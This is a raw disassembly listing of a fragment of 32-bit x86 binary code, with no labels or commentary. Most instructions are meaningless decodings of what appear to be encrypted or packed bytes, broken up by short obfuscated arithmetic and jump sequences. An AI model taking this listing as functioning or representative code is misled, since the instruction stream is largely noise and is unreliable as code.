  40c89a:	arpl   WORD PTR [edi],bp
  40c89c:	adc    DWORD PTR [eax+0x5a92c80f],ebp
  40c8a2:	out    dx,eax
  40c8a3:	cmp    ch,BYTE PTR [ebp-0x57fc9911]
  40c8a9:	gs dec ecx
  40c8ab:	xchg   ebx,eax
  40c8ac:	mov    eax,ds:0x4fcd36a2
  40c8b1:	jmp    0x40c90c
  40c8b3:	pop    esi
  40c8b4:	or     al,dl
  40c8b6:	mov    al,dl
  40c8b8:	xchg   ebp,eax
  40c8b9:	sbb    bl,ch
  40c8bb:	call   0xbcedc3f5
  40c8c0:	push   0x7579aa8d
  40c8c5:	jecxz  0x40c8ea
  40c8c7:	dec    edx
  40c8c8:	sub    DWORD PTR [edi-0x5909b047],ebx
  40c8ce:	pop    edx
  40c8cf:	mov    al,BYTE PTR [eax]
  40c8d1:	or     BYTE PTR [edx],bl
  40c8d3:	and    eax,0xc0bebc93
  40c8d8:	(bad)  
  40c8d9:	out    dx,eax
  40c8da:	ins    DWORD PTR es:[edi],dx
  40c8db:	test   eax,0x1785597d
  40c8e0:	sahf   
  40c8e1:	icebp  
  40c8e2:	jg     0x40c90b
  40c8e4:	dec    edi
  40c8e5:	mov    WORD PTR [ebx],?
  40c8e7:	bound  esp,QWORD PTR [ebx]
  40c8e9:	mov    dl,0x10
  40c8eb:	adc    al,0x5b
  40c8ed:	mov    edi,DWORD PTR [ebp-0x18]
  40c8f0:	xor    edi,eax
  40c8f2:	add    edi,DWORD PTR [ebp-0x14]
  40c8f5:	mov    ebx,DWORD PTR [ebp-0x1c]
  40c8f8:	mov    BYTE PTR [edi+ebx*1+0x32729c],dl
  40c8ff:	mov    edx,DWORD PTR [ebp-0x44]
  40c902:	mov    edi,DWORD PTR [ebp-0xc]
  40c905:	xor    edx,eax
  40c907:	jmp    0x40ccc5
  40c90c:	sbb    al,0xba
  40c90e:	pop    edx
  40c90f:	pop    edx
  40c910:	pop    edx
  40c911:	pop    edx
  40c912:	sbb    al,0xba
  40c914:	adc    edi,DWORD PTR [edi+edi*1-0x3]
  40c918:	mov    ebx,DWORD PTR [ecx]
  40c91a:	sub    al,0x23
  40c91c:	in     al,dx
  40c91d:	xchg   esp,eax
  40c91e:	jo     0x40c990
  40c920:	lahf   
  40c921:	jge    0x40c993
  40c923:	jo     0x40c941
  40c925:	outs   dx,DWORD PTR ds:[esi]
  40c926:	test   al,ah
  40c928:	mov    esp,0x656f4d59
  40c92d:	dec    esp
  40c92e:	mov    es,WORD PTR [ebx]
  40c930:	or     al,0xf
  40c932:	sub    DWORD PTR [ebp+esi*8+0x4e],0xb
  40c937:	lods   eax,DWORD PTR ds:[esi]
  40c938:	cmp    al,0x4d
  40c93a:	inc    edx
  40c93b:	test   BYTE PTR [ecx+0x32],ch
  40c93e:	arpl   bp,di
  40c940:	dec    esp
  40c941:	out    dx,al
  40c942:	push   0xd71a64bf
  40c947:	adc    esp,DWORD PTR [edx-0x7b]
  40c94a:	xchg   BYTE PTR [esi-0x6c],dh
  40c94d:	inc    ebx
  40c94e:	xlat   BYTE PTR ds:[ebx]
  40c94f:	xor    bh,BYTE PTR [ecx]
  40c951:	dec    esi
  40c952:	fmul   QWORD PTR [ebp-0x10d0f399]
  40c958:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c959:	stc    
  40c95a:	mov    ds:0x349e47d8,eax
  40c95f:	ja     0x40c9be
  40c961:	mov    WORD PTR [edi+0x66d0fb47],fs
  40c967:	add    bl,BYTE PTR [edi+ebx*2]
  40c96a:	add    ebx,edi
  40c96c:	inc    esp
  40c96d:	sbb    BYTE PTR [edi+0x73],al
  40c970:	scas   eax,DWORD PTR es:[edi]
  40c971:	std    
  40c972:	xor    eax,0x50fd4c38
  40c977:	cmp    esi,DWORD PTR [edi+edi*8-0x59]
  40c97b:	les    edi,FWORD PTR ss:[edi]
  40c97e:	cmp    dh,BYTE PTR [ebx]
  40c980:	je     0x40c95a
  40c982:	pop    ebp
  40c983:	out    0x8a,eax
  40c985:	and    esi,esp
  40c987:	scas   al,BYTE PTR es:[edi]
  40c988:	dec    esp
  40c989:	dec    edi
  40c98a:	test   DWORD PTR [eax-0x64],ecx
  40c98d:	aas    
  40c98e:	cmp    al,0x17
  40c990:	cmp    bh,BYTE PTR [edi-0x76]
  40c993:	sbb    DWORD PTR [esi+0x6a],edi
  40c996:	(bad)  
  40c998:	popf   
  40c999:	sbb    DWORD PTR [edi+eiz*8-0x29],edx
  40c99d:	shl    ebp,1
  40c99f:	xor    al,0x8c
  40c9a1:	stos   DWORD PTR es:[edi],eax
  40c9a2:	sub    dl,BYTE PTR [eax+ebp*1-0x32]
  40c9a6:	les    ecx,FWORD PTR [esi]
  40c9a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c9a9:	nop
  40c9aa:	fld    QWORD PTR [ebx-0x45]
  40c9ad:	in     al,0x34
  40c9af:	inc    edx
  40c9b0:	popf   
  40c9b1:	jno    0x40c949
  40c9b3:	outs   dx,BYTE PTR ds:[esi]
  40c9b4:	int3   
  40c9b5:	add    BYTE PTR [edi],dl
  40c9b7:	not    ecx
  40c9b9:	jbe    0x40c9ca
  40c9bb:	mov    bl,BYTE PTR [ecx-0x54d37e02]
  40c9c1:	sbb    dh,ch
  40c9c3:	jbe    0x40c9b3
  40c9c5:	pop    esp
  40c9c6:	ret    0x83c3
  40c9c9:	pop    eax
  40c9ca:	jae    0x40c9bd
  40c9cc:	add    dh,BYTE PTR [ecx-0xffe8422]
  40c9d2:	and    al,0x16
  40c9d4:	or     al,0x79
  40c9d6:	cmp    DWORD PTR [eax-0x7a],esp
  40c9d9:	sub    edx,DWORD PTR [eax+0x10]
  40c9dc:	dec    eax
  40c9dd:	daa    
  40c9de:	lds    edi,FWORD PTR [eax+0x67]
  40c9e1:	lods   eax,DWORD PTR ds:[esi]
  40c9e2:	bound  ebp,QWORD PTR [edi+0x1c7d94e8]
  40c9e8:	stc    
  40c9e9:	sbb    edx,0x36
  40c9ec:	and    DWORD PTR [ebx-0x36],ebx
  40c9ef:	sar    eax,cl
  40c9f1:	add    edi,edi
  40c9f3:	pop    esi
  40c9f4:	sahf   
  40c9f5:	or     DWORD PTR [eax+0x69ee15ff],edx
  40c9fb:	int    0xe0
  40c9fd:	push   ebp
  40c9fe:	fs daa 
  40ca00:	adc    DWORD PTR [edx+0x23],eax
  40ca03:	jb     0x40c9a6
  40ca05:	mov    WORD PTR [edx],?
  40ca07:	dec    ecx
  40ca08:	pop    edx
  40ca09:	jle    0x40c9d3
  40ca0b:	imul   esi,DWORD PTR [esi-0x4e],0x5b
  40ca0f:	imul   ebx,DWORD PTR [esi+0x78],0x24816c75
  40ca16:	repnz or ch,BYTE PTR [edx+edi*4+0x589c2282]
  40ca1e:	mov    eax,0x3a089fa
  40ca23:	mov    BYTE PTR [ecx-0x4ea69788],bh
  40ca29:	push   ds
  40ca2a:	jns    0x40c9e7
  40ca2c:	aam    0x3d
  40ca2e:	lea    esi,[ebp-0x1f]
  40ca31:	xchg   BYTE PTR [ebp-0x17a0cff4],cl
  40ca37:	xchg   al,bl
  40ca39:	fdiv   st(0),st
  40ca3b:	and    DWORD PTR [edx+0x5e],0x356788e8
  40ca42:	test   al,0x53
  40ca44:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ca45:	push   ss
  40ca46:	sbb    DWORD PTR [esi],0x7558b61
  40ca4c:	jge    0x40ca5a
  40ca4e:	mov    ebp,DWORD PTR [edi+0x1a88e341]
  40ca54:	xor    ah,BYTE PTR [ebp+0x703f71ba]
  40ca5a:	es jle 0x40ca41
  40ca5d:	jmp    0x6321:0x87131160
  40ca64:	pop    eax
  40ca65:	clc    
  40ca66:	push   0xffffffe6
  40ca68:	xor    BYTE PTR [esi-0x2cca47a5],0xc0
  40ca6f:	in     eax,dx
  40ca70:	fsub   st,st(5)
  40ca72:	imul   esp,DWORD PTR [ebx+ebp*2+0x8],0xffffffcc
  40ca77:	mov    ds:0x63d01923,al
  40ca7c:	xrelease xchg BYTE PTR [ecx+0x58],dl
  40ca80:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ca81:	out    0x1,al
  40ca83:	push   ds
  40ca84:	lods   eax,DWORD PTR ds:[esi]
  40ca85:	mov    bl,0xd6
  40ca87:	sub    ebx,DWORD PTR [esi]
  40ca89:	packuswb mm2,mm7
  40ca8c:	push   DWORD PTR [esi]
  40ca8e:	mov    dl,0x35
  40ca90:	pop    ss
  40ca91:	scas   eax,DWORD PTR es:[edi]
  40ca92:	jne    0x40ca19
  40ca94:	mov    ds:0xbf09473,al
  40ca99:	jmp    0x40ca96
  40ca9b:	cmp    DWORD PTR [edx+0x64698f4e],0x4262fd87
  40caa5:	je     0x40cad4
  40caa7:	ja     0x40cb23
  40caa9:	cdq    
  40caaa:	jns    0x40ca63
  40caac:	cmp    al,0x4f
  40caae:	and    DWORD PTR [eax-0x2c3e879d],edi
  40cab4:	xor    esi,DWORD PTR [ecx-0x6]
  40cab7:	out    dx,al
  40cab8:	fldpi  
  40caba:	out    0x56,al
  40cabc:	push   esi
  40cabd:	inc    ebp
  40cabe:	scas   al,BYTE PTR es:[edi]
  40cabf:	push   ebx
  40cac0:	sbb    al,0x48
  40cac2:	fistp  QWORD PTR [edi]
  40cac4:	lock call 0x485c:0x8c2250f7
  40cacc:	inc    edi
  40cacd:	das    
  40cace:	mov    dh,ah
  40cad0:	adc    ah,dl
  40cad2:	shl    BYTE PTR [edx+ebx*1],cl
  40cad5:	pop    ecx
  40cad6:	jnp    0x40cafd
  40cad8:	push   esi
  40cad9:	dec    ecx
  40cada:	dec    eax
  40cadb:	adc    al,0xf0
  40cadd:	in     al,dx
  40cade:	cmp    DWORD PTR [edx+0x65aa227f],ebx
  40cae4:	ds and ch,al
  40cae7:	add    esp,ebp
  40cae9:	aaa    
  40caea:	cmp    al,BYTE PTR ds:[ebx+0x44b3bb8]
  40caf1:	sbb    edi,eax
  40caf3:	sbb    DWORD PTR [edx-0x7d966bae],esi
  40caf9:	cli    
  40cafa:	push   esi
  40cafb:	add    ecx,esp
  40cafd:	lods   eax,DWORD PTR ds:[esi]
  40cafe:	inc    ebx
  40caff:	inc    esp
  40cb00:	mov    al,0xf7
  40cb02:	sar    DWORD PTR [eax+edi*1],0x54
  40cb06:	shr    BYTE PTR [edx],1
  40cb08:	fld    DWORD PTR [esi-0x39365db7]
  40cb0e:	sar    BYTE PTR [edi+0xc],1
  40cb11:	outs   dx,BYTE PTR ds:[esi]
  40cb12:	mov    ebx,DWORD PTR [ecx+0xc]
  40cb15:	inc    eax
  40cb16:	pop    eax
  40cb17:	das    
  40cb18:	inc    esi
  40cb19:	pop    edx
  40cb1a:	fs out dx,al
  40cb1c:	inc    ecx
  40cb1d:	sub    BYTE PTR [ecx],0x8e
  40cb20:	ins    DWORD PTR es:[edi],dx
  40cb21:	cmp    DWORD PTR [edi+0x1da0c926],esi
  40cb27:	loope  0x40cba1
  40cb29:	clc    
  40cb2a:	and    al,0xc4
  40cb2c:	aas    
  40cb2d:	sbb    ch,BYTE PTR [eax-0x6b6c43bb]
  40cb33:	push   0x28
  40cb35:	push   edi
  40cb36:	aam    0x7e
  40cb38:	adc    DWORD PTR [esp+ebx*1-0x5d],edx
  40cb3c:	cmp    al,0x2d
  40cb3e:	outs   dx,BYTE PTR ds:[esi]
  40cb3f:	lods   al,BYTE PTR ds:[esi]
  40cb40:	ror    BYTE PTR [edx],cl
  40cb42:	add    al,0xd7
  40cb44:	out    0x99,eax
  40cb46:	sbb    eax,0xcfbad503
  40cb4b:	imul   eax,ebp,0x39
  40cb4e:	call   0x39b0:0x4f5a6c0a
  40cb55:	test   eax,0x1afc7b89
  40cb5a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cb5b:	call   0x9844:0xc2c7dbb7
  40cb62:	leave  
  40cb63:	sbb    bl,dh
  40cb65:	push   edx
  40cb66:	enter  0x5b04,0xa0
  40cb6a:	dec    eax
  40cb6b:	dec    ebx
  40cb6c:	dec    ebx
  40cb6d:	add    bh,BYTE PTR [esi]
  40cb6f:	out    dx,al
  40cb70:	(bad)  
  40cb72:	pop    eax
  40cb73:	fldl2e 
  40cb75:	out    0x4c,al
  40cb77:	icebp  
  40cb78:	popf   
  40cb79:	adc    edi,esp
  40cb7b:	push   edi
  40cb7c:	ins    BYTE PTR es:[edi],dx
  40cb7d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cb7e:	arpl   WORD PTR [edx+0x22],sp
  40cb81:	retf   0x5aae
  40cb84:	add    ch,BYTE PTR [esi]
  40cb86:	je     0x40cbfc
  40cb88:	rcl    BYTE PTR [esi+0x9b90a87],1
  40cb8e:	or     al,0xfb
  40cb90:	rcl    BYTE PTR [ebx+0x5cf4f488],0x7d
  40cb97:	jl     0x40cbd4
  40cb99:	pop    eax
  40cb9a:	fcom   DWORD PTR [ebp+0x30067a25]
  40cba0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cba1:	(bad)  
  40cba4:	fcmovnb st,st(2)
  40cba6:	stos   BYTE PTR es:[edi],al
  40cba7:	nop
  40cba8:	fnsave [edi-0x4c]
  40cbab:	(bad)  [eax-0x5a]
  40cbae:	jae    0x40cbf0
  40cbb0:	nop    DWORD PTR [eax-0x39]
  40cbb4:	imul   esi,DWORD PTR [ebx-0x5f67fb5c],0x51d0113b
  40cbbe:	loopne 0x40cb43
  40cbc0:	mov    esi,?
  40cbc2:	arpl   WORD PTR [edx],si
  40cbc4:	xor    bl,BYTE PTR [edx+edx*1+0x2d]
  40cbc8:	mov    ?,WORD PTR [ebp-0x4b]
  40cbcb:	inc    ebx
  40cbcc:	stos   DWORD PTR es:[edi],eax
  40cbcd:	gs retf 
  40cbcf:	mov    DWORD PTR [eax],ecx
  40cbd1:	aas    
  40cbd2:	push   edi
  40cbd3:	lea    ebp,[edi]
  40cbd5:	rcl    esi,1
  40cbd7:	dec    edi
  40cbd8:	iret   
  40cbd9:	(bad)  
  40cbda:	mov    dl,0x11
  40cbdc:	lock xchg edx,eax
  40cbde:	mov    WORD PTR [ebp-0x21],?
  40cbe1:	dec    eax
  40cbe2:	mov    ebp,0xe026f69c
  40cbe7:	pop    ebp
  40cbe8:	sbb    BYTE PTR [eax*4+0x67f8df8c],0x87
  40cbf0:	mov    ds:0x3ae8c0af,al
  40cbf5:	xor    bl,ch
  40cbf7:	fsubr  st,st(6)
  40cbf9:	scas   al,BYTE PTR es:[edi]
  40cbfa:	sbb    ax,0x1f71
  40cbfe:	scas   eax,DWORD PTR es:[edi]
  40cbff:	jge    0x40cbe9
  40cc01:	sar    BYTE PTR [ecx+0x65],1
  40cc04:	mov    bh,0x99
  40cc06:	sbb    BYTE PTR ds:0x17ea6361,bh
  40cc0c:	cld    
  40cc0d:	jg     0x40cc39
  40cc0f:	dec    ebx
  40cc10:	or     esi,DWORD PTR [eax-0x2c89e8d2]
  40cc16:	xlat   BYTE PTR ds:[ebx]
  40cc17:	(bad)  [ebx+0x24]
  40cc1a:	fild   DWORD PTR [eax]
  40cc1c:	add    al,0xe7
  40cc1e:	push   0xfffffff7
  40cc20:	fsub   DWORD PTR [ebx-0x4dfd5d25]
  40cc26:	pop    esp
  40cc27:	in     eax,0x17
  40cc29:	call   0x140d:0x51bd91ed
  40cc30:	mov    BYTE PTR [edi-0x56],ch
  40cc33:	imul   DWORD PTR [eax]
  40cc35:	or     ebp,edx
  40cc37:	push   eax
  40cc38:	xor    ebx,DWORD PTR [ebx-0x6da8dfd1]
  40cc3e:	jecxz  0x40cbec
  40cc40:	push   ebx
  40cc41:	xchg   BYTE PTR [ecx+eiz*2+0x71],bh
  40cc45:	mov    esi,0xb27d3e9d
  40cc4a:	or     al,0xa4
  40cc4c:	(bad)  [esp+esi*1-0x2d]
  40cc50:	aam    0xf4
  40cc52:	(bad)  
  40cc53:	ds cmp eax,0xdf2dea94
  40cc59:	(bad)  [esi]
  40cc5b:	adc    al,BYTE PTR [edx+0x23]
  40cc5e:	xchg   edx,eax
  40cc5f:	into   
  40cc60:	pop    ecx
  40cc61:	aad    0xe7
  40cc63:	add    eax,0xaea4cda0
  40cc68:	test   DWORD PTR [edi+0x62],ebp
  40cc6b:	pusha  
  40cc6c:	or     bh,cl
  40cc6e:	push   ss
  40cc6f:	jle    0x40cceb
  40cc71:	or     dl,BYTE PTR [edi+0x5f71d81e]
  40cc77:	cmp    esi,ebp
  40cc79:	sub    BYTE PTR [edx],bh
  40cc7b:	stos   BYTE PTR es:[edi],al
  40cc7c:	jmp    0x928acbee
  40cc81:	fwait
  40cc82:	mov    ds:0xbd14cc33,eax
  40cc87:	ret    
  40cc88:	cmp    eax,0xcb8fb995
  40cc8d:	jp     0x40cc35
  40cc8f:	mov    ecx,0x61bc9d28
  40cc94:	pop    ebp
  40cc95:	aam    0x40
  40cc97:	outs   dx,DWORD PTR ds:[esi]
  40cc98:	aad    0x82
  40cc9a:	inc    esp
  40cc9b:	ins    DWORD PTR es:[edi],dx
  40cc9c:	mov    eax,ds:0x3f2d81f5
  40cca1:	mov    edi,0x95425cb4
  40cca6:	jno    0x40ccda
  40cca8:	sbb    eax,0x9e7727ae
  40ccad:	pop    edi
  40ccae:	push   ebp
  40ccaf:	test   eax,0xcaaa31b8
  40ccb4:	icebp  
  40ccb5:	xor    ecx,DWORD PTR [eax]
  40ccb7:	shr    edx,0xaa
  40ccba:	mov    dh,0x65
  40ccbc:	mov    eax,ds:0x673c0d54
  40ccc1:	jb     0x40ccc8
  40ccc3:	and    eax,0x3f833b9
  40ccc8:	rol    DWORD PTR [ebx],1
  40ccca:	stc    
  40cccb:	imul   edx,edi
  40ccce:	add    edx,DWORD PTR [ebp-0x14]
  40ccd1:	mov    DWORD PTR [ebp-0x14],edx
  40ccd4:	mov    edx,DWORD PTR [ebp-0xc]
  40ccd7:	mov    edi,DWORD PTR [ebp-0x24]
  40ccda:	xor    edx,eax
  40ccdc:	add    edx,ecx
  40ccde:	imul   edx,edi
  40cce1:	mov    edi,DWORD PTR [ebp-0xc]
  40cce4:	xor    edi,eax
  40cce6:	sub    edx,edi
  40cce8:	mov    edi,DWORD PTR [ebp-0xc]
  40cceb:	mov    ebx,DWORD PTR [ebp-0x14]
  40ccee:	xor    edi,eax
  40ccf0:	add    edi,ecx
  40ccf2:	imul   edi,ebx
  40ccf5:	mov    ebx,DWORD PTR [ebp-0x18]
  40ccf8:	xor    ebx,eax
  40ccfa:	sub    edx,ecx
  40ccfc:	lea    edi,[edi+ebx*1+0x32729c]
  40cd03:	cmp    edi,edx
  40cd05:	jmp    0x40d0c3
  40cd0a:	mov    eax,0xf165d76a
  40cd0f:	popa   
  40cd10:	jbe    0x40cd7b
  40cd12:	(bad)  
  40cd14:	xchg   ebx,eax
  40cd15:	adc    DWORD PTR [ebx+0xbb570b6],0xffffff90
  40cd1c:	jo     0x40cd8e
  40cd1e:	lahf   
  40cd1f:	jge    0x40cd91
  40cd21:	jo     0x40cced
  40cd23:	mov    eax,0x8d3bdad7
  40cd28:	cmovns ebp,edx
  40cd2b:	cmp    al,0xf
  40cd2d:	xchg   BYTE PTR [ebp+0x3b],bl
  40cd30:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cd31:	stos   DWORD PTR es:[edi],eax
  40cd32:	xor    eax,0x664d5dc1
  40cd37:	arpl   si,ax
  40cd39:	or     BYTE PTR fs:[ebp-0x3af33936],dl
  40cd40:	mov    edi,?
  40cd42:	sub    BYTE PTR [si-0x674b],al
  40cd47:	jne    0x40cda1
  40cd49:	ins    DWORD PTR es:[edi],dx
  40cd4a:	pop    ebx
  40cd4b:	ins    BYTE PTR es:[edi],dx
  40cd4c:	xchg   ebx,eax
  40cd4d:	call   0x62b4:0xf0019727
  40cd54:	xchg   ebp,eax
  40cd55:	scas   eax,DWORD PTR es:[edi]
  40cd56:	jae    0x40cd8c
  40cd58:	iret   
  40cd59:	popw   es
  40cd5b:	pop    eax
  40cd5c:	adc    BYTE PTR [ecx],ah
  40cd5e:	push   ds
  40cd5f:	imul   ebp,ebx,0xffffff96
  40cd62:	sahf   
  40cd63:	dec    eax
  40cd64:	mov    BYTE PTR [ebx+0x26553fe9],bl
  40cd6a:	gs jae 0x40cd44
  40cd6d:	dec    edx
  40cd6e:	popa   
  40cd6f:	pop    esi
  40cd70:	xchg   esi,eax
  40cd71:	mov    ecx,0xcd4e59f3
  40cd76:	int    0x6c
  40cd78:	ret    
  40cd79:	clc    
  40cd7a:	call   0x41a2881e
  40cd7f:	xchg   edi,eax
  40cd80:	or     di,WORD PTR [edx]
  40cd83:	bound  esp,QWORD PTR [ecx-0x3594e1ab]
  40cd89:	add    eax,0x7748c747
  40cd8e:	dec    esp
  40cd8f:	pop    edx
  40cd90:	js     0x40cd35
  40cd92:	bound  ebx,QWORD PTR [esi-0xc626f66]
  40cd98:	jle    0x40cd22
  40cd9a:	push   0x7e
  40cd9c:	push   0x4b523952
  40cda1:	mov    ah,0xf1
  40cda3:	cmp    BYTE PTR [eax-0x18],dh
  40cda6:	push   edi
  40cda7:	cmp    DWORD PTR [eax+0x4c],esp
  40cdaa:	hlt    
  40cdab:	and    DWORD PTR [edi-0x53c390c6],eax
  40cdb1:	call   0x8d1a:0x10a4e494
  40cdb8:	addr16 push ebx
  40cdba:	cdq    
  40cdbb:	mov    WORD PTR [eax-0x7331c501],?
  40cdc1:	cdq    
  40cdc2:	jae    0x40cd7e
  40cdc4:	push   edi
  40cdc5:	test   eax,edx
  40cdc7:	add    BYTE PTR [ebx+0x40276c34],bl
  40cdcd:	lods   al,BYTE PTR ds:[esi]
  40cdce:	enter  0xe89e,0x16
  40cdd2:	pop    eax
  40cdd3:	xchg   ebp,eax
  40cdd4:	mov    edx,0xa3c0d2f8
  40cdd9:	fsubr  DWORD PTR [esi]
  40cddb:	sahf   
  40cddc:	jl     0x40cdc9
  40cdde:	fbstp  TBYTE PTR ds:0x8c587d00
  40cde4:	and    esi,esi
  40cde6:	fisubr WORD PTR [esp+eiz*4-0x46b18fbc]
  40cded:	fstp   TBYTE PTR [edx+0x8]
  40cdf0:	clc    
  40cdf1:	stc    
  40cdf2:	add    eax,0xc76b937b
  40cdf7:	call   0xbaec:0x537a295a
  40cdfe:	(bad)
  40ce02:	push   cs
  40ce03:	(bad)  
  40ce04:	mov    al,0xce
  40ce06:	fwait
  40ce07:	mov    edx,0xc622e885
  40ce0c:	sbb    eax,0xfccbd4e9
  40ce11:	and    ch,ah
  40ce13:	(bad)  
  40ce14:	imul   ecx,DWORD PTR [ebp-0x5bef82d5],0xc3de510f
  40ce1e:	es js  0x40ce0f
  40ce21:	adc    al,0x13
  40ce23:	push   ds
  40ce24:	stos   BYTE PTR es:[edi],al
  40ce25:	sub    esi,DWORD PTR ss:[ebx+eiz*4]
  40ce29:	mov    es,WORD PTR [ecx]
  40ce2b:	shl    edx,1
  40ce2d:	xchg   ecx,eax
  40ce2e:	xchg   esp,eax
  40ce2f:	loopne 0x40ce28
  40ce31:	mov    ah,0xef
  40ce33:	nop
  40ce34:	fnstsw WORD PTR [esp+edi*1-0x748a3145]
  40ce3b:	adc    eax,edx
  40ce3d:	cmp    ebx,ebp
  40ce3f:	in     al,0x74
  40ce41:	pop    ebp
  40ce42:	dec    esi
  40ce43:	sbb    bl,cl
  40ce45:	xor    eax,0x6b2b4a61
  40ce4a:	imul   edi,esi,0x544639e3
  40ce50:	and    BYTE PTR [ebp+ebx*8+0x35],cl
  40ce54:	push   ecx
  40ce55:	in     al,dx
  40ce56:	iret   
  40ce57:	or     al,0xa4
  40ce59:	mov    ch,0xb4
  40ce5b:	xor    BYTE PTR [esi+0x6bd3295b],cl
  40ce61:	add    bl,dl
  40ce63:	fs ret 0x43f5
  40ce67:	jmp    0x40ce3a
  40ce69:	js     0x40ce42
  40ce6b:	(bad)  
  40ce6c:	fdivr  DWORD PTR [ebx+0x6b6be3b1]
  40ce72:	fdivrp st(7),st
  40ce74:	inc    esp
  40ce75:	or     DWORD PTR ds:0x8d0e191b,edi
  40ce7b:	das    
  40ce7c:	popf   
  40ce7d:	iret   
  40ce7e:	add    BYTE PTR [eax-0x35657ce4],0xcf
  40ce85:	mov    ecx,0x830a5974
  40ce8a:	daa    
  40ce8b:	daa    
  40ce8c:	mov    al,BYTE PTR [esi]
  40ce8e:	pusha  
  40ce8f:	mov    bl,0x27
  40ce91:	xchg   ecx,eax
  40ce92:	sub    DWORD PTR [esi-0x3244619],edx
  40ce98:	aad    0x20
  40ce9a:	sub    ch,bl
  40ce9c:	dec    ecx
  40ce9d:	stos   DWORD PTR es:[edi],eax
  40ce9e:	push   edx
  40ce9f:	mov    ah,0x4
  40cea1:	sbb    al,0xff
  40cea3:	xchg   ebp,eax
  40cea4:	ja     0x40cece
  40cea6:	inc    esi
  40cea7:	sbb    al,0xe5
  40cea9:	enter  0x69,0x6c
  40cead:	nop
  40ceae:	lea    edx,[edi]
  40ceb0:	jo     0x40ced6
  40ceb2:	retf   0xf0d3
  40ceb5:	add    BYTE PTR ds:0xeea996f3,bl
  40cebb:	out    dx,eax
  40cebc:	call   0x7573a4cd
  40cec1:	push   edi
  40cec2:	pop    ds
  40cec3:	sbb    DWORD PTR [edx-0x6eb69950],0xdcb38cb5
  40cecd:	xchg   edx,eax
  40cece:	loop   0x40ce86
  40ced0:	add    al,0xa0
  40ced2:	aad    0xaa
  40ced4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ced5:	int3   
  40ced6:	xchg   edx,eax
  40ced7:	(bad)  
  40ced8:	mov    BYTE PTR [eax+0x38869e06],ah
  40cede:	mov    bh,0x6
  40cee0:	test   eax,0x72123f0b
  40cee5:	aaa    
  40cee6:	sti    
  40cee7:	xor    DWORD PTR [esi],esp
  40cee9:	lods   eax,DWORD PTR ds:[esi]
  40ceea:	pop    esi
  40ceeb:	popf   
  40ceec:	sub    DWORD PTR [ebp+0x2696aed5],eax
  40cef2:	addr16 mov bh,bl
  40cef5:	lds    ecx,FWORD PTR [ecx]
  40cef7:	out    dx,al
  40cef8:	js     0x40ce92
  40cefa:	fs add eax,0x85da1065
  40cf00:	loopne 0x40cf69
  40cf02:	jle    0x40cf73
  40cf04:	or     BYTE PTR [eax+0x5a],0x83
  40cf08:	fidiv  DWORD PTR ds:0x4e9f750d
  40cf0e:	or     ch,bh
  40cf10:	mov    ebp,0xdabbd2e2
  40cf15:	sub    al,0xe
  40cf17:	pop    ecx
  40cf18:	and    al,dh
  40cf1a:	(bad)  
  40cf1c:	jo     0x40cf98
  40cf1e:	ja     0x40cf59
  40cf20:	es repz push es
  40cf23:	jns    0x40cf1a
  40cf25:	add    al,0x3a
  40cf27:	pop    ebp
  40cf28:	mov    esi,DWORD PTR [esi]
  40cf2a:	adc    BYTE PTR [eax-0x4],bh
  40cf2d:	lods   eax,DWORD PTR ds:[esi]
  40cf2e:	lahf   
  40cf2f:	jmp    0x266f:0xdbe428a9
  40cf36:	std    
  40cf37:	call   0xa52385ed
  40cf3c:	dec    ebx
  40cf3d:	cmc    
  40cf3e:	add    BYTE PTR [eax],dh
  40cf40:	mov    eax,ds:0x6f96e967
  40cf45:	mov    bh,0xa6
  40cf47:	cmp    al,0x24
  40cf49:	outs   dx,BYTE PTR ds:[esi]
  40cf4a:	xchg   dl,bh
  40cf4c:	fist   WORD PTR [ebx+0x5c]
  40cf4f:	gs iret 
  40cf51:	aas    
  40cf52:	add    dh,al
  40cf54:	aas    
  40cf55:	jb     0x40cee9
  40cf57:	mov    edi,ds
  40cf59:	mov    ah,0x23
  40cf5b:	dec    ecx
  40cf5c:	ins    BYTE PTR es:[edi],dx
  40cf5d:	add    al,0x1c
  40cf5f:	sti    
  40cf60:	pop    edx
  40cf61:	clc    
  40cf62:	imul   edx,DWORD PTR [ecx+ebp*2-0x1075b522],0x1791507a
  40cf6d:	push   0x57dc442
  40cf72:	jp     0x40cf9c
  40cf74:	mov    esp,0xba39fb1b
  40cf79:	js     0x40cf6a
  40cf7b:	add    BYTE PTR [eax+0x1f],ch
  40cf7e:	mov    al,ds:0x1bdc78d8
  40cf83:	xchg   ebx,eax
  40cf84:	in     al,dx
  40cf85:	push   eax
  40cf86:	mov    DWORD PTR [edi],edi
  40cf88:	jb     0x40cf4a
  40cf8a:	loopne 0x40cf5f
  40cf8c:	(bad)  
  40cf8e:	loope  0x40cf13
  40cf90:	popa   
  40cf91:	in     al,dx
  40cf92:	or     eax,0x592304e8
  40cf97:	xchg   esp,eax
  40cf98:	js     0x40cf7b
  40cf9a:	loopne 0x40cfe9
  40cf9c:	cmp    dh,BYTE PTR [esi+0x29aeaf76]
  40cfa2:	mov    al,ds:0x2e28404b
  40cfa7:	test   eax,0x10b4226f
  40cfac:	leave  
  40cfad:	push   esp
  40cfae:	ret    
  40cfaf:	sub    BYTE PTR [ebx+0x21],dl
  40cfb2:	dec    esi
  40cfb3:	cmp    BYTE PTR [edi+0x142a3cec],dl
  40cfb9:	push   0x44
  40cfbb:	in     al,0x15
  40cfbd:	push   ds
  40cfbe:	test   BYTE PTR [ebx+0x6c13dd6c],ah
  40cfc4:	mov    ebx,0x686b7979
  40cfc9:	sbb    DWORD PTR [ecx-0x1c5de541],0x8257889b
  40cfd3:	daa    
  40cfd4:	outs   dx,DWORD PTR gs:[esi]
  40cfd6:	ins    BYTE PTR es:[edi],dx
  40cfd7:	mov    al,ds:0x3fbeef09
  40cfdc:	cdq    
  40cfdd:	adc    eax,0x52a19b1e
  40cfe2:	aam    0xb9
  40cfe4:	add    eax,0xc8181fd5
  40cfe9:	add    al,0x6d
  40cfeb:	xor    eax,0xd1efb20b
